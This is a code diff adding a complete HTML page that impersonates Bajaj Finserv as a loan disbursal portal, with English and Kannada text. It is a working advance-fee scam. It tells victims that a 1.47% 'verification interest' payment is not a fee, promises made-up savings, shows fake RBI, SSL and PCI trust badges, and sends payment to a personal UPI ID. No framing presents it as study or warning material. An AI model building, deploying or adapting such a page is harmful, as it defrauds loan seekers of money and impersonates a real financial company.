@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bajaj Finserv | Official Loan Disbursal</title>
+    <style>
+        :root {
+            --primary-blue: #0072bc;
+            --trust-green: #1a8a34;
+            --bg-light: #f4f7f6;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            background-color: #d1d8e0;
+            color: #2d3436;
+            display: flex;
+            justify-content: center;
+            padding: 20px 0;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 450px;
+            background: var(--white);
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Official Header */
+        .header {
+            background: var(--primary-blue);
+            color: white;
+            padding: 20px;
+            text-align: center;
+            border-bottom: 4px solid var(--trust-green);
+        }
+
+        .lang-toggle {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: rgba(255,255,255,0.15);
+            border: 1px solid white;
+            color: white;
+            padding: 4px 10px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: bold;
+        }
+
+        .page { display: none; padding: 24px; animation: fadeIn 0.4s ease; }
+        .page.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Trust Banner */
+        .secure-banner {
+            background: #e7f3ef;
+            border: 1px solid var(--trust-green);
+            border-radius: 12px;
+            padding: 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+
+        .check-icon {
+            background: var(--trust-green);
+            color: white;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
+        }
+
+        /* Clever 2nd Page Design */
+        .verification-box {
+            background: var(--bg-light);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 5px solid var(--trust-green);
+        }
+
+        .step-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 18px;
+        }
+
+        .step-text h4 { margin: 0; font-size: 14px; color: var(--primary-blue); }
+        .step-text p { margin: 4px 0 0; font-size: 12px; color: #636e72; line-height: 1.4; }
+
+        .highlight-green {
+            color: var(--trust-green);
+            font-weight: bold;
+            background: #dff9fb;
+            padding: 2px 5px;
+            border-radius: 4px;
+        }
+
+        /* Calculation Area */
+        .amount-input-group {
+            margin-top: 25px;
+        }
+
+        input[type="number"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #dfe6e9;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: bold;
+            outline: none;
+            transition: 0.3s;
+        }
+
+        input[type="number"]:focus { border-color: var(--primary-blue); background: #f0f7ff; }
+
+        .result-card {
+            background: linear-gradient(135deg, var(--primary-blue), #00a8ff);
+            color: white;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+            box-shadow: 0 10px 20px rgba(0,114,188,0.3);
+        }
+
+        .btn-main {
+            width: 100%;
+            background: var(--trust-green);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            box-shadow: 0 5px 15px rgba(26,138,52,0.3);
+        }
+
+        .upi-box {
+            background: #fff;
+            border: 2px dashed #b2bec3;
+            padding: 15px;
+            border-radius: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .copy-btn {
+            background: var(--primary-blue);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 6px;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        #loader {
+            display: none;
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.95);
+            z-index: 1000;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader-spin {
+            width: 50px; height: 50px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--trust-green);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="app-container">
+    <div id="loader">
+        <div class="loader-spin"></div>
+        <p style="margin-top:20px; font-weight:bold; color:var(--trust-green);" id="l-load">Securing Loan Account...</p>
+    </div>
+
+    <div class="header">
+        <button class="lang-toggle" onclick="toggleLanguage()">ಕನ್ನಡ / EN</button>
+        <div style="font-weight: 900; font-size: 1.5rem; letter-spacing: 1px;">BAJAJ FINSERV</div>
+        <div style="font-size: 10px; opacity: 0.8; margin-top: 5px;" id="h-tag">LENDING • INSURANCE • WEALTH</div>
+    </div>
+
+    <div id="page1" class="page active">
+        <div class="secure-banner">
+            <div class="check-icon">✓</div>
+            <div style="font-size: 12px; color: var(--trust-green); font-weight: 600;" id="w-verify">Verified Merchant Account • RBI Compliant</div>
+        </div>
+        <h2 id="w-title" style="margin-top:0;">Instant Disbursal Portal</h2>
+        <p id="w-desc" style="font-size: 14px; color: #636e72;">Welcome to the secure portal. Your approved loan is ready for transfer. Complete the final verification to release funds.</p>
+        <img src="https://img.icons8.com/color/200/guarantee.png" style="width:120px; display:block; margin: 20px auto;">
+        <button class="btn-main" onclick="nextPage(2)" id="w-btn">Verify & Proceed</button>
+    </div>
+
+    <div id="page2" class="page">
+        <h3 id="t-title" style="color: var(--trust-green); margin-top:0;">Final Disbursal Steps</h3>
+        <p id="t-desc" style="font-size: 13px; color: #636e72; margin-bottom: 20px;">Please confirm the following account benefit activations:</p>
+
+        <div class="verification-box">
+            <div class="step-item">
+                <div class="check-icon">✓</div>
+                <div class="step-text">
+                    <h4 id="opt1-t">Advance Interest Credit</h4>
+                    <p id="opt1-d">This 1.47% is NOT a fee. It is your <span class="highlight-green">1st Month Interest</span> paid in advance. It will show in your statement as a credit balance.</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="check-icon">✓</div>
+                <div class="step-text">
+                    <h4 id="opt2-t">EMI Protection Plan (Active)</h4>
+                    <p id="opt2-d">By proceeding, you receive a <span class="highlight-green">₹29 discount</span> on every EMI for 36 months. Total customer benefit: ₹1,044.</p>
+                </div>
+            </div>
+
+            <div class="step-item">
+                <div class="check-icon">✓</div>
+                <div class="step-text">
+                    <h4 id="opt3-t">Funds Security</h4>
+                    <p id="opt3-d">This ensures your loan amount is disbursed to the correct bank account with <span class="highlight-green">Zero Risk</span> of rejection.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="amount-input-group">
+            <label id="l-amt" style="font-size: 12px; font-weight: bold; color: var(--primary-blue);">ENTER APPROVED LOAN AMOUNT:</label>
+            <input type="number" id="loanAmount" placeholder="₹ Enter Amount" oninput="calculate()">
+        </div>
+
+        <div class="result-card">
+            <div style="font-size: 12px; opacity: 0.9;" id="l-calc">Total Verification Amount</div>
+            <div style="font-size: 36px; font-weight: bold;" id="intDisplay">₹0.00</div>
+            <div id="save-note" style="font-size: 11px; margin-top: 10px; background: rgba(255,255,255,0.2); padding: 5px; border-radius: 5px; display:none;">
+                Congrats! You save ₹1,044 on your total loan.
+            </div>
+        </div>
+
+        <button class="btn-main" onclick="startLoading()" id="t-btn">Confirm & Disburse</button>
+    </div>
+
+    <div id="page3" class="page" style="text-align: center;">
+        <h3 id="p-title" style="margin-top:0;">Secure Payment Gateway</h3>
+        <div class="secure-banner" style="justify-content: center;">
+            <span style="font-size: 12px;">🔒 256-bit SSL Encryption Active</span>
+        </div>
+
+        <div style="background: #fdfdfd; padding: 20px; border-radius: 15px; border: 1px solid #eee;">
+            <p style="font-size: 12px; color: #636e72; margin: 0;" id="p-label">Verification Interest Amount</p>
+            <h1 id="finalAmount" style="font-size: 40px; color: var(--primary-blue); margin: 10px 0;">₹0.00</h1>
+            
+            <div class="upi-box">
+                <div style="text-align: left;">
+                    <small style="font-size: 10px; color: #b2bec3;">OFFICIAL UPI ID</small><br>
+                    <span style="font-weight: bold; font-size: 15px;">9880505308@fam</span>
+                </div>
+                <div class="copy-btn" onclick="copyUPI()" id="copyText">Copy</div>
+            </div>
+        </div>
+
+        <p style="font-size: 13px; font-weight: bold; color: #2d3436; margin: 25px 0 15px;" id="p-method">Pay using any UPI App</p>
+        <div style="display: flex; justify-content: space-around; margin-bottom: 25px;">
+            <img src="https://img.icons8.com/color/48/google-logo.png" width="40">
+            <img src="https://img.icons8.com/color/48/phone-pe.png" width="40">
+            <img src="https://img.icons8.com/color/48/paytm.png" width="40">
+        </div>
+
+        <button class="btn-main" onclick="alert('Redirecting to secure bank app...')">Proceed to Pay</button>
+        
+        <div style="margin-top: 25px; display: flex; justify-content: center; gap: 15px; opacity: 0.5;">
+            <img src="https://img.icons8.com/ios-filled/50/000000/pci-compliant.png" width="30">
+            <img src="https://img.icons8.com/color/48/rbi.png" width="30">
+        </div>
+        <p style="font-size: 10px; color: #b2bec3; margin-top: 15px;">© 2026 Bajaj Finserv. All rights reserved.</p>
+    </div>
+</div>
+
+<script>
+    let currentLang = 'en';
+    const translations = {
+        en: {
+            h_tag: "LENDING • INSURANCE • WEALTH",
+            w_verify: "Verified Merchant Account • RBI Compliant",
+            w_title: "Instant Disbursal Portal",
+            w_desc: "Welcome to the secure portal. Your approved loan is ready for transfer. Complete the final verification to release funds.",
+            w_btn: "Verify & Proceed",
+            t_title: "Final Disbursal Steps",
+            opt1_t: "Advance Interest Credit",
+            opt1_d: "This 1.47% is NOT a fee. It is your 1st Month Interest paid in advance. It will show in your statement as a credit balance.",
+            opt2_t: "EMI Protection Plan (Active)",
+            opt2_d: "By proceeding, you receive a ₹29 discount on every EMI for 36 months. Total customer benefit: ₹1,044.",
+            opt3_t: "Funds Security",
+            opt3_d: "This ensures your loan amount is disbursed to the correct bank account with Zero Risk of rejection.",
+            l_amt: "ENTER APPROVED LOAN AMOUNT:",
+            l_calc: "Total Verification Amount",
+            t_btn: "Confirm & Disburse",
+            p_title: "Secure Payment Gateway",
+            p_label: "Verification Interest Amount",
+            p_method: "Pay using any UPI App",
+            l_load: "Securing Loan Account..."
+        },
+        kn: {
+            h_tag: "ಸಾಲ • ವಿಮೆ • ಸಂಪತ್ತು",
+            w_verify: "ಪರಿಶೀಲಿಸಿದ ವ್ಯಾಪಾರಿ ಖಾತೆ • RBI ಅನುಸರಣೆ",
+            w_title: "ತ್ವರಿತ ಸಾಲ ವಿತರಣಾ ಪೋರ್ಟಲ್",
+            w_desc: "ಸುರಕ್ಷಿತ ಪೋರ್ಟಲ್‌ಗೆ ಸುಸ್ವಾಗತ. ನಿಮ್ಮ ಸಾಲ ವರ್ಗಾವಣೆಗೆ ಸಿದ್ಧವಾಗಿದೆ. ಹಣವನ್ನು ಬಿಡುಗಡೆ ಮಾಡಲು ಅಂತಿಮ ಪರಿಶೀಲನೆಯನ್ನು ಪೂರ್ಣಗೊಳಿಸಿ.",
+            w_btn: "ಪರಿಶೀಲಿಸಿ ಮತ್ತು ಮುಂದುವರಿಯಿರಿ",
+            t_title: "ಅಂತಿಮ ವಿತರಣಾ ಹಂತಗಳು",
+            opt1_t: "ಮುಂಗಡ ಬಡ್ಡಿ ಕ್ರೆಡಿಟ್",
+            opt1_d: "ಈ 1.47% ಶುಲ್ಕವಲ್ಲ. ಇದು ನಿಮ್ಮ ಮೊದಲ ತಿಂಗಳ ಬಡ್ಡಿಯಾಗಿದೆ. ಇದನ್ನು ನಿಮ್ಮ ಲೋನ್ ಸ್ಟೇಟ್‌ಮೆಂಟ್‌ನಲ್ಲಿ ಕ್ರೆಡಿಟ್ ಆಗಿ ತೋರಿಸಲಾಗುತ್ತದೆ.",
+            opt2_t: "EMI ರಕ್ಷಣೆ ಯೋಜನೆ (ಸಕ್ರಿಯ)",
+            opt2_d: "ಮುಂದುವರಿಯುವ ಮೂಲಕ, ನೀವು 36 ತಿಂಗಳವರೆಗೆ ಪ್ರತಿ EMI ನಲ್ಲಿ ₹29 ರಿಯಾಯಿತಿ ಪಡೆಯುತ್ತೀರಿ. ಒಟ್ಟು ಲಾಭ: ₹1,044.",
+            opt3_t: "ಹಣದ ಭದ್ರತೆ",
+            opt3_d: "ಇದು ನಿಮ್ಮ ಸಾಲದ ಮೊತ್ತವನ್ನು ಸರಿಯಾದ ಬ್ಯಾಂಕ್ ಖಾತೆಗೆ ಯಾವುದೇ ತೊಂದರೆಯಿಲ್ಲದೆ ತಲುಪಿಸುವುದನ್ನು ಖಚಿತಪಡಿಸುತ್ತದೆ.",
+            l_amt: "ಅನುಮೋದಿತ ಸಾಲದ ಮೊತ್ತವನ್ನು ನಮೂದಿಸಿ:",
+            l_calc: "ಒಟ್ಟು ಪರಿಶೀಲನಾ ಮೊತ್ತ",
+            t_btn: "ಖಚಿತಪಡಿಸಿ ಮತ್ತು ವಿತರಿಸಿ",
+            p_title: "ಸುರಕ್ಷಿತ ಪಾವತಿ ಗೇಟ್‌ವೇ",
+            p_label: "ಪರಿಶೀಲನಾ ಬಡ್ಡಿ ಮೊತ್ತ",
+            p_method: "ಯಾವುದೇ UPI ಅಪ್ಲಿಕೇಶನ್ ಬಳಸಿ ಪಾವತಿಸಿ",
+            l_load: "ಸಾಲದ ಖಾತೆಯನ್ನು ಸುರಕ್ಷಿತಗೊಳಿಸಲಾಗುತ್ತಿದೆ..."
+        }
+    };
+
+    function toggleLanguage() {
+        currentLang = currentLang === 'en' ? 'kn' : 'en';
+        const t = translations[currentLang];
+        document.getElementById('h-tag').innerText = t.h_tag;
+        document.getElementById('w-verify').innerText = t.w_verify;
+        document.getElementById('w-title').innerText = t.w_title;
+        document.getElementById('w-desc').innerText = t.w_desc;
+        document.getElementById('w-btn').innerText = t.w_btn;
+        document.getElementById('t-title').innerText = t.t_title;
+        document.getElementById('opt1-t').innerText = t.opt1_t;
+        document.getElementById('opt1-d').innerHTML = t.opt1_d;
+        document.getElementById('opt2-t').innerText = t.opt2_t;
+        document.getElementById('opt2-d').innerHTML = t.opt2_d;
+        document.getElementById('opt3-t').innerText = t.opt3_t;
+        document.getElementById('opt3-d').innerHTML = t.opt3_d;
+        document.getElementById('l-amt').innerText = t.l_amt;
+        document.getElementById('l-calc').innerText = t.l_calc;
+        document.getElementById('t-btn').innerText = t.t_btn;
+        document.getElementById('p-title').innerText = t.p_title;
+        document.getElementById('p-label').innerText = t.p_label;
+        document.getElementById('p-method').innerText = t.p_method;
+        document.getElementById('l-load').innerText = t.l_load;
+    }
+
+    function nextPage(n) {
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        document.getElementById('page' + n).classList.add('active');
+        window.scrollTo(0,0);
+    }
+
+    function calculate() {
+        const amt = document.getElementById('loanAmount').value;
+        const interest = (amt * 0.0147).toFixed(2);
+        const note = document.getElementById('save-note');
+        
+        if(amt > 0) {
+            const formatted = parseFloat(interest).toLocaleString('en-IN');
+            document.getElementById('intDisplay').innerText = '₹' + formatted;
+            document.getElementById('finalAmount').innerText = '₹' + formatted;
+            note.style.display = 'block';
+        } else {
+            document.getElementById('intDisplay').innerText = '₹0.00';
+            note.style.display = 'none';
+        }
+    }
+
+    function startLoading() {
+        if(document.getElementById('loanAmount').value < 100) {
+            alert(currentLang === 'en' ? "Please enter a valid loan amount." : "ದಯವಿಟ್ಟು ಸರಿಯಾದ ಸಾಲದ ಮೊತ್ತವನ್ನು ನಮೂದಿಸಿ.");
+            return;
+        }
+        document.getElementById('loader').style.display = 'flex';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            nextPage(3);
+        }, 2500);
+    }
+
+    function copyUPI() {
+        navigator.clipboard.writeText("9880505308@fam").then(() => {
+            const btn = document.getElementById('copyText');
+            btn.innerText = "COPIED";
+            btn.style.background = "#1a8a34";
+            setTimeout(() => {
+                btn.innerText = "Copy";
+                btn.style.background = "#0072bc";
+            }, 2000);
+        });
+    }
+</script>
+
+</body>
+</html>
